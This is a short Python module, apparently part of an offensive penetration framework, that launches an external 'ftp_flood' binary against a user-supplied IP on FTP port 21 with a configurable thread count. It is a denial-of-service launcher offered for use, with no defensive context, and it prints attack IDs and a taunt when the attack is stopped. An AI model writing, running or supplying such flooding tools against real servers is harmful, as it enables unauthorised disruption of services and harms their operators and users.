import subprocess
import os

REQUIRED_OPTIONS = {
        "IP": "",
        "THREAD": "example: 1000"
}

def execute(options):
    target = options.get("IP")
    port = "21"
    threads = options.get("THREAD")

    bin_path = "./modules/auxiliary/dos/ftp/src/ftp_flood"

    if not target:
        print("[-] Error: TARGET is missing!")
        return

    print(f"[*] Preparing DoS to {target}:{port}")

    try:
        process = subprocess.Popen(
            [bin_path, "-t", target, "-p", port, "-w", threads],
            stdout=None,
            stderr=None
        )

        print(f"[+] Attack ID: {process.pid}")
        print("[!] Press Ctrl+C to stop the flood.\n")

        process.wait()

    except KeyboardInterrupt:
        process.terminate()
        print("\n\n[!] Attack Terminated. Target might be down or lucky.")
    except Exception as e:
        print(f"[-] Error: {e}")
